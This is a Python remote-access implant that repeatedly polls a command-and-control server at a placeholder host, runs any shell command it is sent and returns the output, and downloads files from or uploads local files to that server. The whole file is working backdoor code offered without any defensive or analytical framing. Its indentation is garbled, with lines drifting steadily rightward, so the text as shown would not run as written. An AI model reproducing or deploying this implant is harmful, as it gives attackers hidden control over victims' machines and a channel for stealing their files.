import requests
import subprocess
import platform
import os
import time

# === C2 SERVER CONFIGURATION ===
C2_SERVER = "http://example-c2-server.com"
BEACON_ENDPOINT = f"{C2_SERVER}/get-command"
RESULT_ENDPOINT = f"{C2_SERVER}/post-result"
DOWNLOAD_ENDPOINT = f"{C2_SERVER}/download-file"
UPLOAD_ENDPOINT = f"{C2_SERVER}/upload-file"

HOSTNAME = platform.node()
SLEEP_TIME = 5  # seconds between each beacon

def get_command():
    try:
            response = requests.get(BEACON_ENDPOINT, params={"host": HOSTNAME})
                    return response.text.strip()
                        except:
                                return ""

                                def post_result(output):
                                    try:
                                            requests.post(RESULT_ENDPOINT, data={"host": HOSTNAME, "output": output})
                                                except:
                                                        pass

                                                        def download_file(filename):
                                                            try:
                                                                    url = f"{DOWNLOAD_ENDPOINT}?file={filename}"
                                                                            r = requests.get(url)
                                                                                    with open(filename, "wb") as f:
                                                                                                f.write(r.content)
                                                                                                        post_result(f"File downloaded: {filename}")
                                                                                                            except Exception as e:
                                                                                                                    post_result(f"Download error: {str(e)}")

                                                                                                                    def upload_file(filename):
                                                                                                                        try:
                                                                                                                                with open(filename, "rb") as f:
                                                                                                                                            files = {'file': (filename, f)}
                                                                                                                                                        r = requests.post(UPLOAD_ENDPOINT, files=files)
                                                                                                                                                                post_result(f"File uploaded: {filename}")
                                                                                                                                                                    except Exception as e:
                                                                                                                                                                            post_result(f"Upload error: {str(e)}")

                                                                                                                                                                            def execute_command(cmd):
                                                                                                                                                                                if cmd.startswith("download "):
                                                                                                                                                                                        filename = cmd.split(" ", 1)[1]
                                                                                                                                                                                                download_file(filename)
                                                                                                                                                                                                    elif cmd.startswith("upload "):
                                                                                                                                                                                                            filename = cmd.split(" ", 1)[1]
                                                                                                                                                                                                                    upload_file(filename)
                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                                                                                                                                                                                                                                                        post_result(output.decode('utf-8', errors='ignore'))
                                                                                                                                                                                                                                                                except Exception as e:
                                                                                                                                                                                                                                                                            post_result(f"Execution error: {str(e)}")

                                                                                                                                                                                                                                                                            def run():
                                                                                                                                                                                                                                                                                while True:
                                                                                                                                                                                                                                                                                        cmd = get_command()
                                                                                                                                                                                                                                                                                                if cmd and cmd.lower() != "none":
                                                                                                                                                                                                                                                                                                            execute_command(cmd)
                                                                                                                                                                                                                                                                                                                    time.sleep(SLEEP_TIME)

                                                                                                                                                                                                                                                                                                                    if __name__ == "__main__":
                                                                                                                                                                                                                                                                                                                        run()
                                                                                                                                                                                                                                                                                                                        